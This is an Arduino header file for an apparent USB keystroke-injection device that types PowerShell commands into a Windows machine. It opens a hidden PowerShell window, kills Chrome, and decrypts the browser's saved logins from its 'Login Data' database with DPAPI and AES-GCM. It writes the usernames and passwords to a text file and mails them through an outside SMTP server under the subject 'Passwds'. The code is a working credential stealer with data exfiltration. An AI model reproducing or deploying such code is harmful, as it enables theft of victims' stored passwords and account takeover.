#ifndef MYFUNCTIONS_H
#define MYFUNCTIONS_H

#include "Keyboard.h"

#define _DELAY 300

// hit key with delay (miliseconds): _DELAY
void _hitKey(int key){ 
  Keyboard.press(key);
  delay(_DELAY);
  Keyboard.release(key);
}

// windows run (win+r)
void _run(){ 
  Keyboard.press(KEY_LEFT_GUI);
  _hitKey('r');
  Keyboard.releaseAll();
}

// run hidden powershell
void _hiddenPS(){
  delay(1000);
  _run();
  Keyboard.print("powershell -w h");
  _hitKey(KEY_RETURN);
}

// speak
void _speak(char* txt) {
    Keyboard.print("$s=New-Object -ComObject SAPI.SPVoice"); // create only one time
    _hitKey(KEY_RETURN);
    Keyboard.print("$s.Speak('");
    Keyboard.print(txt);
    Keyboard.print("')"); 
    _hitKey(KEY_RETURN);
}

void _closeWindow(){
  Keyboard.press(KEY_LEFT_ALT);
  _hitKey(KEY_F4);
  delay(_DELAY);
  Keyboard.releaseAll();
}

void _cd_system32(){
  Keyboard.print("cd \\Windows\\System32");
  _hitKey(KEY_RETURN);
}

void _selectAddressBar(){
  Keyboard.press(KEY_LEFT_ALT);
  _hitKey('d');
  delay(_DELAY);
  Keyboard.releaseAll();
}

void _selectAll() {
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('a'); // ctrl+a
  delay(_DELAY);
  Keyboard.releaseAll();
}

void _cut() {
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('x'); // ctrl+x
  delay(_DELAY);
  Keyboard.releaseAll();
}

void _copy() {
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('c'); // ctrl+c
  delay(_DELAY);
  Keyboard.releaseAll();
}

void _paste() {
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('v'); // ctrl+v
  delay(_DELAY);
  Keyboard.releaseAll();
}

// sends email with given credentials
void _sendEmail(char *login, char *passwd, char* dest) {
  char *attachmentpath = "C:\\Users\\Seba_S\\Desktop\\attachment.txt";

  Keyboard.print("function Send-ToEmail([string]$email)");
  Keyboard.print(" { $message = new-object Net.Mail.MailMessage;");
  Keyboard.print("$message.From = \"");
  Keyboard.print(login);
  Keyboard.print("\";");
  Keyboard.print(" $message.To.Add($email);");
  Keyboard.print("$message.Subject = 'Passwds';");
  Keyboard.print("$message.Body = 'You are welcome';");
  Keyboard.print("$attachment = New-Object Net.Mail.Attachment(\"");
  Keyboard.print(attachmentpath);
  Keyboard.print("\");");
  Keyboard.print("$message.Attachments.Add($attachment);");

  Keyboard.print("$smtp = new-object Net.Mail.SmtpClient('smtp.poczta.onet.pl', '587');");
  Keyboard.print("$smtp.EnableSSL = $true;");
  Keyboard.print("$smtp.Credentials = New-Object System.Net.NetworkCredential(\"");
  Keyboard.print(login);
  Keyboard.print("\", \"");
  Keyboard.print(passwd);
  Keyboard.print("\");");
  Keyboard.print("$smtp.send($message);");
  Keyboard.print("write-host 'Mail Sent';"); 
  Keyboard.print("$attachment.Dispose();");
  Keyboard.print("}");

  Keyboard.print("Send-ToEmail  -email '");
  Keyboard.print(dest);
  Keyboard.print("';");
  _hitKey(KEY_RETURN);

}


void _takeSaveData(){
  Keyboard.print("Stop-Process -Name Chrome;"); 
  _hitKey(KEY_RETURN);
  Keyboard.print("$d=Add-Type -A System.Security;"); 
  _hitKey(KEY_RETURN);
  Keyboard.print("$p='public static';"); 
  _hitKey(KEY_RETURN);
  Keyboard.print("$g=\"\"\")]$p extern\";"); 
  _hitKey(KEY_RETURN);
  Keyboard.print("$i='[DllImport(\"winsqlite3\",EntryPoint=\"sqlite3_';"); 
  _hitKey(KEY_RETURN);
  Keyboard.print("$m=\"[MarshalAs(UnmanagedType.LP\";"); 
  _hitKey(KEY_RETURN);
  Keyboard.print("$q='(s,i)';"); 
  _hitKey(KEY_RETURN);
  Keyboard.print("$f='(p s,int i)';"); 
  _hitKey(KEY_RETURN);
  Keyboard.print("$z=$env:LOCALAPPDATA+'\\Google\\Chrome\\User Data';"); 
  _hitKey(KEY_RETURN);
  Keyboard.print("$u=[Security.Cryptography.ProtectedData];"); 
  _hitKey(KEY_RETURN);
  Keyboard.print("Add-Type \"using System.Runtime.InteropServices;using p=System.IntPtr;$p class W{$($i)open$g p O($($m)Str)]string f,out p d);$($i)prepare16_v2$g p P(p d,$($m)WStr)]string l,int n,out p s,p t);$($i)step$g p S(p s);$($i)column_text16$g p C$f;$($i)column_bytes$g int Y$f;$($i)column_blob$g p L$f;$p string T$f{return Marshal.PtrToStringUni(C$q);}$p byte[] B$f{var r=new byte[Y$q];Marshal.Copy(L$q,r,0,Y$q);return r;}}\""); 
  _hitKey(KEY_RETURN);
  Keyboard.print("$s=[W]::O(\"$z\\Default\\Login Data\",[ref]$d);"); 
  _hitKey(KEY_RETURN);
  Keyboard.print("$l=@();"); 
  _hitKey(KEY_RETURN);
  Keyboard.print("if($host.Version-like\"7*\"){$b=(gc \"$z\\Local State\"|ConvertFrom-Json).os_crypt.encrypted_key;"); 
  _hitKey(KEY_RETURN);
  Keyboard.print("$x=[Security.Cryptography.AesGcm]::New($u::Unprotect([Convert]::FromBase64String($b)[5..($b.length-1)],$n,0))} $_=[W]::P($d,\"SELECT*FROM logins WHERE blacklisted_by_user=0\",-1,[ref]$s,0);"); 
  _hitKey(KEY_RETURN);
  Keyboard.print("for(;!([W]::S($s)%100)){$l+=[W]::T($s,0),[W]::T($s,3);"); 
  _hitKey(KEY_RETURN);
  Keyboard.print("$c=[W]::B($s,5);"); 
  _hitKey(KEY_RETURN);
  Keyboard.print("try{$e=$u::Unprotect($c,$n,0)}catch{if($x){$k=$c.length;"); 
  _hitKey(KEY_RETURN);
  Keyboard.print("$e=[byte[]]::new($k-31);"); 
  _hitKey(KEY_RETURN);
  Keyboard.print("$x.Decrypt($c[3..14],$c[15..($k-17)],$c[($k-16)..($k-1)],$e)}}$l+=($e|%{[char]$_})-join''}"); 
  _hitKey(KEY_RETURN);

  Keyboard.print("$l > C:\\Users\\Seba_S\\Desktop\\attachment.txt");
  _hitKey(KEY_RETURN);
}

#endif